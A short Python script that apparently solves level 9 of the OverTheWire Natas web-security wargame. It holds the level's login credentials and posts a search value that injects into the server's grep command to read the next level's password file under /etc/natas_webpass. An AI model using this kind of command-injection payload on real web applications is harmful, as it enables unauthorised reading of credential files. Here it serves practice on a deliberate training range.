import requests
import re

url = 'http://natas9.natas.labs.overthewire.org'
user = 'natas9'
#proxies = {"http": "http://127.0.0.1:8080"}
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'
data = {'needle' : '"^" /etc/natas_webpass/natas10 #',
		'submit':'Search'
		}
r1 = requests.post(url,data=data,auth=(user,password))
print r1.text

